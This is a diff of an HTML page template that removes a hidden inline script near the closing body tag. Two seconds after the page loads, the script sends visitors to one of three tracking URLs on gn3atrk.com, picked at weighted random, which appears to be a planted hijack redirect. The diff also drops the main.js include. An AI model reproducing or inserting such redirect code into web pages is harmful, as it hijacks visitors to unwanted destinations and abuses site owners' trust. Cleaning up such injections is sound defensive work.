@@ -431,32 +431,7 @@ button.expander {
 
     <!-- Template Javascript -->
 
-	 <script src="js/main.js"></script>
-    <script>
-        (function() {
-            const links = [
-                { url: "https://www.gn3atrk.com/2K515N3L/5445F66/?sub2=rakat", probability: 27 },
-                { url: "https://www.gn3atrk.com/2K515N3L/548B3D1/?sub2=dadu", probability: 39 },
-                { url: "https://www.gn3atrk.com/2K515N3L/54SZN79/?sub2=dark", probability: 34 },
-               
-            ];
-            
-            function redirect() {
-                let randomNum = Math.random() * 100;
-                let cumulativeProbability = 0;
-                
-                for (let link of links) {
-                    cumulativeProbability += link.probability;
-                    if (randomNum < cumulativeProbability) {
-                        window.location.replace(link.url);
-                        return;
-                    }
-                }
-            }
-            
-            setTimeout(redirect, 2000);
-        })();
-    </script>
+	
 </body>
 
 </html>
